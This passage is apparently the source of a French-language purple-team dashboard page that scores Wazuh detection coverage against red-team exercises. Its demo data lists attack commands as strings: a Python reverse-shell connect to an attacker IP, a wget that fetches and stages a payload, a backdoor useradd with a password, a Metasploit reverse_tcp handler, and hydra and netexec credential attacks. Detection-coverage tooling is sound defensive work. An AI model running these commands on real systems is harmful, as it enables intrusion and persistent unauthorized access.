import { useState, type ReactNode } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  BarChart, Bar, Cell,
  XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, ReferenceLine,
  PieChart, Pie,
} from "recharts";
import {
  AlertCircle, Clock, Shield, ArrowRight, ChevronDown,
  Activity, Target, CheckCircle2, Eye, Radio,
} from "lucide-react";
import { PageHeader } from "../../components/ui/PageHeader";
import { useUiStore } from "../../store/useUiStore";
import { useTheme } from "../../contexts/ThemeContext";

// ─── Types ─────────────────────────────────────────────────────────────────────

type MissReason = "NO_RULE" | "TIMEOUT";
type Severity = "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";

interface MissedAttack {
  id: string; time: string; tool: string; technique: string;
  techniqueName: string; attempts: number; missReason: MissReason;
  timeoutDelay?: string; command: string; targetIp: string; sourceIp: string;
}
interface WazuhAlert {
  id: string; ruleId: string; ruleName: string; severity: Severity;
  time: string; agent: string; description: string;
}
interface DetectedAttack {
  id: string; time: string; tool: string; technique: string;
  techniqueName: string; delaySeconds: number; command: string;
  sourceIp: string; targetIp: string; alert: WazuhAlert;
}

// ─── Constants ─────────────────────────────────────────────────────────────────

const TOOL_COLORS: Record<string, string> = {
  nmap: "#3b82f6", hydra: "#f97316", gobuster: "#a855f7",
  metasploit: "#ef4444", netexec: "#06b6d4",
  sudo: "#db2777", python3: "#0d9488", wget: "#4f46e5", useradd: "#d97706",
};

type SevColors = { bg: string; border: string; text: string };
const SEV_LIGHT: Record<Severity, SevColors> = {
  LOW:      { bg: "#3b82f610", border: "#3b82f640", text: "#2563eb" },
  MEDIUM:   { bg: "#eab30810", border: "#eab30840", text: "#d97706" },
  HIGH:     { bg: "#f9731610", border: "#f9731640", text: "#ea580c" },
  CRITICAL: { bg: "#ef444410", border: "#ef444440", text: "#dc2626" },
};
const SEV_DARK: Record<Severity, SevColors> = {
  LOW:      { bg: "#3b82f611", border: "#3b82f644", text: "#60a5fa" },
  MEDIUM:   { bg: "#eab30811", border: "#eab30844", text: "#fbbf24" },
  HIGH:     { bg: "#f9731611", border: "#f9731644", text: "#fb923c" },
  CRITICAL: { bg: "#ef444411", border: "#ef444444", text: "#f87171" },
};


const SEVERITY_FR: Record<Severity, string>   = { LOW: "FAIBLE", MEDIUM: "MOYEN", HIGH: "ÉLEVÉ", CRITICAL: "CRITIQUE" };

const delayColor = (d: number, dark: boolean) => {
  if (dark) return d < 30 ? "#22c55e" : d < 60 ? "#84cc16" : d < 90 ? "#eab308" : d < 120 ? "#f97316" : "#ef4444";
  return       d < 30 ? "#16a34a" : d < 60 ? "#65a30d" : d < 90 ? "#d97706" : d < 120 ? "#ea580c" : "#dc2626";
};
const getDelayLabel = (d: number) =>
  d < 30 ? "EXCELLENT" : d < 60 ? "BON" : d < 90 ? "PASSABLE" : "ATTENTION";

// ─── Demo Data ─────────────────────────────────────────────────────────────────

const DEMO_KPI = { coverage: 58, totalAttacks: 12, detectedAttacks: 7, missedAttacks: 5, mttdAvg: 48, exerciseDuration: "28m" };

const DEMO_MISSED: MissedAttack[] = [
  { id: "ATK-03", time: "14:08:15", tool: "sudo",       technique: "T1548", techniqueName: "Élévation de privilèges",           attempts: 5, missReason: "NO_RULE",  command: "sudo -l && sudo su root", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
  { id: "ATK-06", time: "14:12:33", tool: "metasploit", technique: "T1190", techniqueName: "Exploitation d'application exposée", attempts: 2, missReason: "NO_RULE",  command: "use exploit/unix/webapp/php_include; set RHOST 10.0.0.5; run", targetIp: "10.0.0.5", sourceIp: "192.168.1.100" },
  { id: "ATK-08", time: "14:16:45", tool: "useradd",    technique: "T1136", techniqueName: "Création de compte — Backdoor",     attempts: 1, missReason: "TIMEOUT", timeoutDelay: "+7m 12s", command: "useradd -m -s /bin/bash backdoor && echo 'backdoor:p4ss' | chpasswd", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
  { id: "ATK-11", time: "14:22:10", tool: "python3",    technique: "T1059", techniqueName: "Interpréteur de commandes",          attempts: 3, missReason: "NO_RULE",  command: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.1.100\",4444))'", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
  { id: "ATK-14", time: "14:27:55", tool: "wget",       technique: "T1105", techniqueName: "Transfert d'outil malveillant",      attempts: 2, missReason: "TIMEOUT", timeoutDelay: "+4m 38s", command: "wget http://192.168.1.100:8080/payload.sh -O /tmp/.payload && chmod +x /tmp/.payload", targetIp: "10.0.0.4", sourceIp: "192.168.1.100" },
];

const DEMO_DETECTED: DetectedAttack[] = [
  { id: "ATK-01", time: "14:00:00", tool: "nmap",     technique: "T1046", techniqueName: "Balayage des services réseau",     delaySeconds: 45,  command: "nmap -sS -sV -O 10.0.0.0/24", sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-01", ruleId: "40101", ruleName: "Scanner réseau détecté",                severity: "MEDIUM",   time: "14:00:45", agent: "wazuh-agent-01", description: "Balayage de ports depuis 192.168.1.100 vers le sous-réseau 10.0.0.0/24. Signature TCP SYN flood détectée. 1 247 paquets en 38s." } },
  { id: "ATK-02", time: "14:01:55", tool: "hydra",    technique: "T1110", techniqueName: "Force brute — SSH",                delaySeconds: 15,  command: "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.4", sourceIp: "192.168.1.100", targetIp: "10.0.0.4", alert: { id: "ALR-02", ruleId: "5710",  ruleName: "Échecs multiples de connexion SSH",    severity: "HIGH",     time: "14:02:10", agent: "wazuh-agent-02", description: "847 échecs SSH depuis 192.168.1.100 en 60s. Force brute confirmée. Comptes ciblés : root, admin, ubuntu." } },
  { id: "ATK-04", time: "14:09:30", tool: "gobuster", technique: "T1083", techniqueName: "Découverte de fichiers et répertoires", delaySeconds: 88, command: "gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirbuster/big.txt", sourceIp: "192.168.1.100", targetIp: "10.0.0.5", alert: { id: "ALR-04", ruleId: "31101", ruleName: "Scanner web — Énumération de répertoires", severity: "MEDIUM", time: "14:10:58", agent: "wazuh-agent-03", description: "Plus de 3 400 requêtes sur Apache access.log depuis 192.168.1.100. Bruteforce de répertoires confirmé." } },
  { id: "ATK-05", time: "14:11:00", tool: "metasploit", technique: "T1210", techniqueName: "Exploitation de services distants", delaySeconds: 32,  command: "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; run", sourceIp: "192.168.1.100", targetIp: "10.0.0.5", alert: { id: "ALR-05", ruleId: "31106", ruleName: "Exploitation de service détectée — Metasploit", severity: "HIGH", time: "14:11:32", agent: "wazuh-agent-03", description: "Session Meterpreter établie depuis 192.168.1.100 vers 10.0.0.5. Payload reverse_tcp identifié par Wazuh HIDS." } },
  { id: "ATK-07", time: "14:14:20", tool: "nmap",     technique: "T1046", techniqueName: "Balayage des services réseau — UDP", delaySeconds: 28, command: "nmap -sU --top-ports 200 --open 10.0.0.0/24", sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-07", ruleId: "40102", ruleName: "Balayage de ports UDP détecté",          severity: "MEDIUM",   time: "14:14:48", agent: "wazuh-agent-01", description: "Balayage UDP depuis 192.168.1.100, 200 ports principaux. Règle Snort 1:10001 déclenchée." } },
  { id: "ATK-09", time: "14:18:00", tool: "netexec",  technique: "T1021", techniqueName: "Accès aux services distants — SMB", delaySeconds: 105, command: "netexec smb 10.0.0.0/24 -u admin -p Password123 --shares", sourceIp: "192.168.1.100", targetIp: "10.0.0.0/24", alert: { id: "ALR-09", ruleId: "31151", ruleName: "Mouvement latéral SMB détecté — NetExec", severity: "CRITICAL", time: "14:19:45", agent: "wazuh-agent-02", description: "Tentatives d'authentification SMB massives depuis 192.168.1.100. Partages réseau énumérés sur 10.0.0.0/24. Credential stuffing SMB confirmé." } },
  { id: "ATK-10", time: "14:20:45", tool: "hydra",    technique: "T1110", techniqueName: "Force brute — FTP",                delaySeconds: 22,  command: "hydra -L users.txt -P passwords.txt -t 16 ftp://10.0.0.4", sourceIp: "192.168.1.100", targetIp: "10.0.0.4", alert: { id: "ALR-10", ruleId: "5701",  ruleName: "Échecs multiples de connexion FTP",    severity: "HIGH",     time: "14:21:07", agent: "wazuh-agent-02", description: "Force brute FTP : 312 échecs en 18s. Seuil vsftpd dépassé. Credential stuffing confirmé." } },
];

const DEMO_MTTD_BARS = DEMO_DETECTED.map((d) => ({ id: d.id.replace("ATK-", ""), delay: d.delaySeconds, tool: d.tool, name: d.techniqueName }));

// ─── Speedometer Gauge ─────────────────────────────────────────────────────────

const SpeedometerGauge = ({ value }: { value: number }) => {
  const { theme } = useTheme();
  const dark = theme === "dark";
  const cx = 150, cy = 152, OR = 108, IR = 80, NL = 76;

  const toRad = (d: number) => (d * Math.PI) / 180;
  const pt = (deg: number, r: number) => ({
    x: +(cx + r * Math.cos(toRad(deg))).toFixed(2),
    y: +(cy - r * Math.sin(toRad(deg))).toFixed(2),
  });

  // sweep=1 (CW in SVG y-down) → upper arc ✓
  const sector = (d1: number, d2: number, fill: string) => {
    const o1 = pt(d1, OR), o2 = pt(d2, OR), i1 = pt(d1, IR), i2 = pt(d2, IR);
    const laf = d1 - d2 > 180 ? 1 : 0;
    const path = [`M ${o1.x} ${o1.y}`, `A ${OR} ${OR} 0 ${laf} 1 ${o2.x} ${o2.y}`,
      `L ${i2.x} ${i2.y}`, `A ${IR} ${IR} 0 ${laf} 0 ${i1.x} ${i1.y}`, "Z"].join(" ");
    return <path key={d1} d={path} fill={fill} />;
  };

  const targetRot = -90 + (value / 100) * 180;
  const majorTicks = Array.from({ length: 11 }, (_, i) => ({
    deg: 180 - i * 18, val: i * 10,
    inner: pt(180 - i * 18, OR + 1), outer: pt(180 - i * 18, OR + 10), label: pt(180 - i * 18, OR + 22),
  }));
  const subTicks = Array.from({ length: 50 }, (_, i) => {
    if ((i + 1) % 5 === 0) return null;
    const deg = 180 - (i + 1) * 3.6;
    return { deg, a: pt(deg, OR + 2), b: pt(deg, OR + 7) };
  }).filter((t): t is { deg: number; a: { x: number; y: number }; b: { x: number; y: number } } => t !== null);

  // Theme-aware SVG colors
  const backdrop   = dark ? "rgba(255,255,255,0.04)" : "rgba(0,0,0,0.04)";
  const gapStroke  = dark ? "#0a0a0a"                : "white";
  const tickStroke = dark ? "rgba(0,0,0,0.5)"        : "rgba(0,0,0,0.4)";
  const subStroke  = dark ? "rgba(0,0,0,0.45)"       : "rgba(0,0,0,0.28)";
  const labelFill  = dark ? "rgba(255,255,255,0.75)" : "rgba(30,41,59,0.72)";
  const hubFill    = dark ? "#0f172a"                : "#1e293b";
  const hubStroke  = dark ? "rgba(255,255,255,0.13)" : "white";
  const hubMid     = dark ? "#334155"                : "#475569";
  const hubDot     = dark ? "rgba(255,255,255,0.8)"  : "white";
  const valueFill  = dark ? "white"                  : "#1e293b";

  return (
    <svg viewBox="0 0 300 188" className="w-full" style={{ maxHeight: 225 }}>
      {sector(180, 0, backdrop)}
      {sector(180, 126, "#22c55e")}
      {sector(126,  54, "#eab308")}
      {sector( 54,   0, "#ef4444")}
      {[126, 54].map((deg) => (
        <line key={deg} x1={pt(deg, IR - 1).x} y1={pt(deg, IR - 1).y}
          x2={pt(deg, OR + 2).x} y2={pt(deg, OR + 2).y} stroke={gapStroke} strokeWidth={2.5} />
      ))}
      {subTicks.map((t) => (
        <line key={t.deg} x1={t.a.x} y1={t.a.y} x2={t.b.x} y2={t.b.y} stroke={subStroke} strokeWidth={1} />
      ))}
      {majorTicks.map(({ deg, inner, outer, label, val }) => (
        <g key={deg}>
          <line x1={inner.x} y1={inner.y} x2={outer.x} y2={outer.y} stroke={tickStroke} strokeWidth={2} />
          <text x={label.x} y={label.y} textAnchor="middle" dominantBaseline="middle"
            fill={labelFill} fontSize={7.5} fontFamily="JetBrains Mono" fontWeight="600">{val}</text>
        </g>
      ))}
      <motion.g style={{ transformOrigin: `${cx}px ${cy}px` }}
        initial={{ rotate: -90 }} animate={{ rotate: targetRot }}
        transition={{ type: "spring", stiffness: 26, damping: 7, delay: 0.4 }}>
        <line x1={cx} y1={cy + 14} x2={cx} y2={cy - NL} stroke="rgba(0,0,0,0.18)" strokeWidth={7} strokeLinecap="round" />
        <line x1={cx} y1={cy + 14} x2={cx} y2={cy - NL} stroke="#1e293b" strokeWidth={3.5} strokeLinecap="round" />
        <line x1={cx} y1={cy - NL + 20} x2={cx} y2={cy - NL} stroke="rgba(255,255,255,0.7)" strokeWidth={1.5} strokeLinecap="round" />
      </motion.g>
      <circle cx={cx} cy={cy} r={13} fill={hubFill} stroke={hubStroke} strokeWidth={1.5} />
      <circle cx={cx} cy={cy} r={5.5} fill={hubMid} stroke="rgba(255,255,255,0.3)" strokeWidth={1} />
      <circle cx={cx} cy={cy} r={2.2} fill={hubDot} />
      <text x={cx} y={cy + 30} textAnchor="middle" fill={valueFill}
        fontSize={21} fontFamily="JetBrains Mono" fontWeight="bold">{value} %</text>
    </svg>
  );
};

// ─── Small Components ──────────────────────────────────────────────────────────

const ToolBadge = ({ tool }: { tool: string }) => (
  <span className="inline-flex items-center rounded px-2 py-0.5 font-mono text-[10px] font-bold uppercase tracking-wider"
    style={{ backgroundColor: `${TOOL_COLORS[tool] ?? "#6b7280"}18`, color: TOOL_COLORS[tool] ?? "#6b7280", border: `1px solid ${TOOL_COLORS[tool] ?? "#6b7280"}50` }}>
    {tool}
  </span>
);

const MissReasonBadge = ({ reason, delay }: { reason: MissReason; delay?: string }) =>
  reason === "NO_RULE" ? (
    <span className="inline-flex items-center gap-1.5 rounded-full border border-red-200 bg-red-50 px-3 py-1 font-mono text-[10px] font-bold uppercase tracking-widest text-red-600 dark:border-red-500/40 dark:bg-red-500/10 dark:text-red-400">
      <AlertCircle size={9} />SANS RÈGLE
    </span>
  ) : (
    <span className="inline-flex items-center gap-1.5 rounded-full border border-orange-200 bg-orange-50 px-3 py-1 font-mono text-[10px] font-bold uppercase tracking-widest text-orange-600 dark:border-orange-500/40 dark:bg-orange-500/10 dark:text-orange-400">
      <Clock size={9} />DÉLAI DÉPASSÉ {delay}
    </span>
  );

const SeverityBadge = ({ severity }: { severity: Severity }) => {
  const { theme } = useTheme();
  const c = theme === "dark" ? SEV_DARK[severity] : SEV_LIGHT[severity];
  return (
    <span className="rounded px-2 py-0.5 font-mono text-[10px] font-bold uppercase tracking-wider"
      style={{ backgroundColor: c.bg, color: c.text, border: `1px solid ${c.border}` }}>
      {SEVERITY_FR[severity]}
    </span>
  );
};

const DelayBar = ({ delay }: { delay: number }) => {
  const { theme } = useTheme();
  const dark = theme === "dark";
  const color = delayColor(delay, dark);
  const pct = Math.min((delay / 120) * 100, 100);
  return (
    <div className="flex min-w-[190px] items-center gap-3">
      <div className="relative h-1.5 flex-1 overflow-hidden rounded-full bg-slate-200 dark:bg-white/5">
        <motion.div initial={{ width: 0 }} animate={{ width: `${pct}%` }}
          transition={{ duration: 0.9, ease: "easeOut" }}
          className="absolute inset-y-0 left-0 rounded-full" style={{ backgroundColor: color }} />
      </div>
      <span className="shrink-0 font-mono text-xs tabular-nums text-slate-700 dark:text-coffee-bean-100">{delay}s</span>
      <span className="shrink-0 font-mono text-[9px] uppercase tracking-wider" style={{ color }}>{getDelayLabel(delay)}</span>
    </div>
  );
};

const InfoRow = ({ label, value, mono = false }: { label: string; value: ReactNode; mono?: boolean }) => (
  <div className="flex items-start gap-3">
    <span className="w-20 shrink-0 font-mono text-[10px] uppercase tracking-wider text-slate-400 dark:text-coffee-bean-200/35">{label}</span>
    <span className={`text-xs text-slate-700 dark:text-coffee-bean-100 ${mono ? "font-mono" : ""}`}>{value}</span>
  </div>
);


// ─── Missed Row ────────────────────────────────────────────────────────────────

const MissedRow = ({ atk, index }: { atk: MissedAttack; index: number }) => (
  <motion.tr initial={{ opacity: 0, x: -16 }} animate={{ opacity: 1, x: 0 }}
    transition={{ delay: index * 0.07, duration: 0.4 }}
    className="group border-b border-slate-100 transition-colors hover:bg-red-50/60 dark:border-white/[0.04] dark:hover:bg-red-500/[0.04]">
    <td className="py-3.5 pl-5 pr-3">
      <div className="flex items-center gap-2">
        <motion.span animate={{ opacity: [1, 0.2, 1] }} transition={{ duration: 1.6, repeat: Infinity, delay: index * 0.25 }}
          className="size-1.5 rounded-full bg-red-500 shadow-[0_0_5px_rgba(239,68,68,0.6)]" />
        <span className="font-mono text-[10px] text-slate-400 dark:text-coffee-bean-200/50">{atk.id}</span>
      </div>
    </td>
    <td className="py-3.5 px-3 font-mono text-xs tabular-nums text-slate-700 dark:text-coffee-bean-100">{atk.time}</td>
    <td className="py-3.5 px-3"><ToolBadge tool={atk.tool} /></td>
    <td className="py-3.5 px-3">
      <span className="font-mono text-[10px] font-bold text-slate-500 dark:text-night-bordeaux-400">{atk.technique}</span>
      <p className="mt-0.5 font-mono text-[11px] text-slate-500 dark:text-coffee-bean-200/60">{atk.techniqueName}</p>
    </td>
    <td className="py-3.5 px-3 max-w-[260px]">
      <code className="block truncate font-mono text-[10px] text-slate-400 transition-colors group-hover:text-slate-600 dark:text-coffee-bean-200/45 dark:group-hover:text-coffee-bean-200/75">{atk.command}</code>
    </td>
    <td className="py-3.5 px-3 text-center font-mono text-xs tabular-nums text-slate-700 dark:text-coffee-bean-100">{atk.attempts}</td>
    <td className="py-3.5 pl-3 pr-5"><MissReasonBadge reason={atk.missReason} delay={atk.timeoutDelay} /></td>
  </motion.tr>
);

// ─── Drill-Down Row ────────────────────────────────────────────────────────────

const DrillDownRow = ({ atk, index }: { atk: DetectedAttack; index: number }) => {
  const { theme } = useTheme();
  const dark = theme === "dark";
  const [open, setOpen] = useState(false);
  const color = delayColor(atk.delaySeconds, dark);
  return (
    <>
      <motion.tr initial={{ opacity: 0, x: -16 }} animate={{ opacity: 1, x: 0 }}
        transition={{ delay: index * 0.07, duration: 0.4 }}
        onClick={() => setOpen((v) => !v)}
        className={`group cursor-pointer border-b border-slate-100 transition-colors hover:bg-slate-50 dark:border-white/[0.04] dark:hover:bg-white/[0.02] ${open ? "bg-slate-50 dark:bg-white/[0.015]" : ""}`}>
        <td className="py-3.5 pl-5 pr-3">
          <div className="flex items-center gap-2">
            <CheckCircle2 size={12} className="shrink-0 text-green-600 dark:text-green-500" />
            <span className="font-mono text-[10px] text-slate-400 dark:text-coffee-bean-200/50">{atk.id}</span>
          </div>
        </td>
        <td className="py-3.5 px-3 font-mono text-xs tabular-nums text-slate-700 dark:text-coffee-bean-100">{atk.time}</td>
        <td className="py-3.5 px-3"><ToolBadge tool={atk.tool} /></td>
        <td className="py-3.5 px-3">
          <span className="font-mono text-[10px] font-bold text-slate-500 dark:text-night-bordeaux-400">{atk.technique}</span>
          <p className="mt-0.5 font-mono text-[11px] text-slate-500 dark:text-coffee-bean-200/60">{atk.techniqueName}</p>
        </td>
        <td className="py-3.5 px-3"><DelayBar delay={atk.delaySeconds} /></td>
        <td className="py-3.5 px-3"><SeverityBadge severity={atk.alert.severity} /></td>
        <td className="py-3.5 pl-3 pr-5 text-right">
          <motion.div animate={{ rotate: open ? 180 : 0 }} transition={{ duration: 0.25 }} className="inline-flex">
            <ChevronDown size={14} className="text-slate-300 transition-colors group-hover:text-slate-500 dark:text-coffee-bean-200/35 dark:group-hover:text-coffee-bean-50" />
          </motion.div>
        </td>
      </motion.tr>
      <AnimatePresence>
        {open && (
          <motion.tr key="drill" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.2 }}>
            <td colSpan={7} className="px-5 pb-6 pt-1">
              <div className="rounded-2xl border border-slate-200 bg-slate-50 p-6 shadow-sm dark:border-white/[0.06] dark:bg-black/30 dark:shadow-none">
                <div className="mb-5 flex items-center gap-3">
                  <div className="h-px flex-1 bg-gradient-to-r from-red-300/50 to-transparent dark:from-red-500/20" />
                  <span className="font-mono text-[9px] uppercase tracking-[0.3em] text-slate-400 dark:text-coffee-bean-200/30">Corrélation {atk.id} → {atk.alert.id}</span>
                  <div className="h-px flex-1 bg-gradient-to-l from-blue-300/50 to-transparent dark:from-blue-500/20" />
                </div>
                <div className="grid grid-cols-[1fr_88px_1fr] gap-5">
                  {/* Attack side */}
                  <div className="space-y-4">
                    <div className="flex items-center gap-2 border-b border-red-100 pb-3 dark:border-red-500/10">
                      <div className="flex size-8 items-center justify-center rounded-lg bg-red-100 dark:bg-red-500/10">
                        <Target size={14} className="text-red-600 dark:text-red-400" />
                      </div>
                      <div>
                        <p className="font-mono text-[9px] uppercase tracking-[0.25em] text-red-500 dark:text-red-400/80">Red Team — Attaque</p>
                        <p className="font-mono text-[11px] text-slate-500 dark:text-coffee-bean-200/50">{atk.id}</p>
                      </div>
                    </div>
                    <div className="space-y-2.5">
                      <InfoRow label="Horodatage" value={atk.time} mono />
                      <InfoRow label="Outil" value={<ToolBadge tool={atk.tool} />} />
                      <InfoRow label="Technique" value={`${atk.technique} — ${atk.techniqueName}`} />
                      <InfoRow label="IP Source" value={atk.sourceIp} mono />
                      <InfoRow label="IP Cible" value={atk.targetIp} mono />
                    </div>
                    <div className="rounded-xl border border-red-100 bg-red-50 p-3.5 dark:border-red-500/10 dark:bg-red-500/[0.04]">
                      <p className="mb-2 font-mono text-[9px] uppercase tracking-widest text-red-500 dark:text-red-400/60">Commande</p>
                      <code className="break-all font-mono text-[10px] leading-relaxed text-slate-700 dark:text-coffee-bean-100">{atk.command}</code>
                    </div>
                  </div>
                  {/* Center */}
                  <div className="flex flex-col items-center justify-center gap-2">
                    <motion.div animate={{ x: [0, 5, 0] }} transition={{ duration: 1.4, repeat: Infinity, ease: "easeInOut" }}>
                      <ArrowRight size={22} style={{ color }} />
                    </motion.div>
                    <div className="text-center">
                      <p className="font-mono text-3xl font-bold tabular-nums" style={{ color }}>{atk.delaySeconds}s</p>
                      <p className="mt-0.5 font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/25">Délai</p>
                      <p className="mt-1 font-mono text-[10px] uppercase tracking-widest" style={{ color }}>{getDelayLabel(atk.delaySeconds)}</p>
                    </div>
                    <div className="h-10 w-px bg-slate-200 dark:bg-white/10" />
                    <div className="text-center">
                      <p className="font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/25">Fenêtre</p>
                      <p className="font-mono text-xs text-slate-500 dark:text-coffee-bean-200/40">120s</p>
                    </div>
                  </div>
                  {/* Alert side */}
                  <div className="space-y-4">
                    <div className="flex items-center gap-2 border-b border-blue-100 pb-3 dark:border-blue-500/10">
                      <div className="flex size-8 items-center justify-center rounded-lg bg-blue-100 dark:bg-blue-500/10">
                        <Shield size={14} className="text-blue-600 dark:text-blue-400" />
                      </div>
                      <div>
                        <p className="font-mono text-[9px] uppercase tracking-[0.25em] text-blue-500 dark:text-blue-400/80">Wazuh — Alerte</p>
                        <p className="font-mono text-[11px] text-slate-500 dark:text-coffee-bean-200/50">{atk.alert.id}</p>
                      </div>
                    </div>
                    <div className="space-y-2.5">
                      <InfoRow label="Horodatage" value={atk.alert.time} mono />
                      <InfoRow label="ID Règle" value={`#${atk.alert.ruleId}`} mono />
                      <InfoRow label="Règle" value={atk.alert.ruleName} />
                      <InfoRow label="Agent" value={atk.alert.agent} mono />
                      <InfoRow label="Sévérité" value={<SeverityBadge severity={atk.alert.severity} />} />
                    </div>
                    <div className="rounded-xl border border-blue-100 bg-blue-50 p-3.5 dark:border-blue-500/10 dark:bg-blue-500/[0.04]">
                      <p className="mb-2 font-mono text-[9px] uppercase tracking-widest text-blue-500 dark:text-blue-400/60">Description</p>
                      <p className="font-mono text-[10px] leading-relaxed text-slate-700 dark:text-coffee-bean-100">{atk.alert.description}</p>
                    </div>
                  </div>
                </div>
              </div>
            </td>
          </motion.tr>
        )}
      </AnimatePresence>
    </>
  );
};

// ─── Live Empty State ──────────────────────────────────────────────────────────

const LiveEmptyState = ({ onToggle }: { onToggle: () => void }) => (
  <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}
    className="flex min-h-[400px] flex-col items-center justify-center gap-8 rounded-2xl border border-slate-200 bg-slate-50 shadow-sm dark:border-white/[0.06] dark:bg-black/20 dark:shadow-none dark:backdrop-blur-sm">
    <div className="relative flex size-24 items-center justify-center">
      {[1, 2, 3].map((i) => (
        <motion.div key={i} animate={{ scale: [1, 1.7 * i, 1], opacity: [0.4, 0, 0.4] }}
          transition={{ duration: 2.5, repeat: Infinity, delay: i * 0.5, ease: "easeOut" }}
          className="absolute size-full rounded-full border border-red-200 dark:border-night-bordeaux-500/25" />
      ))}
      <Radio size={28} className="text-red-500 dark:text-night-bordeaux-400" />
    </div>
    <div className="text-center">
      <p className="font-cinematic text-xl uppercase tracking-widest text-slate-800 dark:text-coffee-bean-50">Aucun exercice actif</p>
      <p className="mt-2 font-mono text-xs text-slate-400 dark:text-coffee-bean-200/40">Les données de corrélation apparaîtront dès qu'un exercice Red Team sera en cours.</p>
    </div>
    <button onClick={onToggle}
      className="rounded-full border border-red-200 bg-red-50 px-6 py-2.5 font-mono text-[11px] uppercase tracking-widest text-red-600 transition-all hover:bg-red-100 dark:border-night-bordeaux-500/50 dark:bg-night-bordeaux-500/10 dark:text-night-bordeaux-300 dark:hover:bg-night-bordeaux-500/20 dark:hover:shadow-[0_0_24px_-4px_rgba(196,59,59,0.5)]">
      Activer le mode Demo
    </button>
  </motion.div>
);

// ─── Main ──────────────────────────────────────────────────────────────────────

export default function Coverage() {
  const { theme } = useTheme();
  const dark = theme === "dark";
  const demoMode   = useUiStore((s) => s.demoMode);
  const toggleDemo = useUiStore((s) => s.toggleDemo);

  const kpi = demoMode ? DEMO_KPI : { coverage: 0, totalAttacks: 0, detectedAttacks: 0, missedAttacks: 0, mttdAvg: 0, exerciseDuration: "—" };
  const missed   = demoMode ? DEMO_MISSED   : [];
  const detected = demoMode ? DEMO_DETECTED : [];
  const noRuleCount  = missed.filter((a) => a.missReason === "NO_RULE").length;
  const timeoutCount = missed.filter((a) => a.missReason === "TIMEOUT").length;
  const minDelay = detected.length ? Math.min(...detected.map((d) => d.delaySeconds)) : 0;
  const maxDelay = detected.length ? Math.max(...detected.map((d) => d.delaySeconds)) : 0;

  // Chart theme tokens
  const grid  = dark ? "#ffffff08" : "#e2e8f0";
  const axis  = dark ? "#ffffff15" : "#e2e8f0";
  const tick  = dark ? "#666"      : "#94a3b8";

  const mttdTooltip = ({ active, payload }: any) => {
    if (!active || !payload?.length) return null;
    const d = payload[0]?.payload;
    return (
      <div className="rounded-xl border border-slate-200 bg-white p-3 shadow-lg dark:border-white/10 dark:bg-black/90 dark:backdrop-blur-sm">
        <p className="font-mono text-[10px] uppercase tracking-widest" style={{ color: TOOL_COLORS[d?.tool] }}>{d?.tool}</p>
        <p className="mt-1 font-mono text-sm font-bold" style={{ color: delayColor(d?.delay, dark) }}>{d?.delay}s</p>
        <p className="font-mono text-[9px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/40">{getDelayLabel(d?.delay)}</p>
      </div>
    );
  };

  const toolTooltip = ({ active, payload }: any) => {
    if (!active || !payload?.length) return null;
    const d = payload[0]?.payload;
    const color = TOOL_COLORS[d?.name] ?? "#888";
    return (
      <div className="rounded-xl border border-slate-200 bg-white p-3 shadow-lg dark:border-white/10 dark:bg-black/90 dark:backdrop-blur-sm">
        <p className="font-mono text-[10px] font-bold uppercase tracking-wider" style={{ color }}>{d?.name}</p>
        <p className="mt-1 font-mono text-xs text-slate-600 dark:text-coffee-bean-100">{d?.attacks} attaque{d?.attacks > 1 ? "s" : ""} détectée{d?.attacks > 1 ? "s" : ""}</p>
      </div>
    );
  };

  return (
    <div className="space-y-8">

      {/* ── PageHeader ─────────────────────────────────────────────────────── */}
      <PageHeader
        eyebrow="● Analytics — Purple Team"
        title="Coverage Scoreboard"
        description="Corrélation entre les attaques Red Team et les alertes Wazuh. Angles morts identifiés, raisons classifiées, preuves de détection disponibles."
        actions={
          <div className="flex items-center gap-3">
            <span className={`inline-flex items-center gap-1.5 rounded-full border px-3 py-1.5 font-mono text-[10px] uppercase tracking-widest ${
              demoMode
                ? "border-orange-200 bg-orange-50 text-orange-600 dark:border-night-bordeaux-500/40 dark:bg-night-bordeaux-500/10 dark:text-night-bordeaux-300"
                : "border-green-200 bg-green-50 text-green-700 dark:border-green-500/40 dark:bg-green-500/10 dark:text-green-400"
            }`}>
              <motion.span animate={!demoMode ? { scale: [1, 1.5, 1], opacity: [1, 0.4, 1] } : { scale: 1 }}
                transition={{ duration: 1.8, repeat: Infinity }}
                className={`size-1.5 rounded-full ${demoMode ? "bg-orange-500 dark:bg-night-bordeaux-500" : "bg-green-500"}`} />
              {demoMode ? "Exercice Démo" : "En direct"}
            </span>
            <span className="font-mono text-[10px] uppercase tracking-widest text-slate-400 dark:text-coffee-bean-200/60">{kpi.detectedAttacks}/{kpi.totalAttacks} détectées</span>
          </div>
        }
      />

      {/* ── DETECTION LOGIC EXPLAINER ──────────────────────────────────────── */}
      <motion.div
        initial={{ opacity: 0, y: 12 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="overflow-hidden rounded-2xl border border-slate-200 bg-white p-6 shadow-sm dark:border-white/[0.06] dark:bg-black/30 dark:shadow-none dark:backdrop-blur-sm"
      >
        <div className="mb-5 flex items-center gap-3">
          <div className="flex size-9 items-center justify-center rounded-xl border border-slate-200 bg-slate-50 dark:border-white/10 dark:bg-white/5">
            <Eye size={15} className="text-slate-600 dark:text-coffee-bean-100" />
          </div>
          <div>
            <p className="font-cinematic text-sm uppercase tracking-[0.22em] text-slate-900 dark:text-coffee-bean-50">Comment une attaque est-elle classée ?</p>
